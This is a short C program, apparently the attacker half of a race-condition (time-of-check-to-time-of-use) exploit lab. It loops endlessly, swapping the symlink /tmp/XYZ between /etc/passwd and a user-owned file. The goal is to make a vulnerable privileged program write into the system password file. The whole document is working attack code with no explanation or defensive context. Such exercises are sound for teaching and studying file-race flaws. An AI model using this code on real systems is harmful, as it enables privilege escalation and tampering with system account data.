#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
int main() {
	while(1) {
		symlink("/etc/passwd", "/tmp/XYZ");
		unlink("/tmp/XYZ");
		symlink("/tmp/XXX", "/tmp/XYZ");
		unlink("/tmp/XYZ");
	}
	return 0;
}
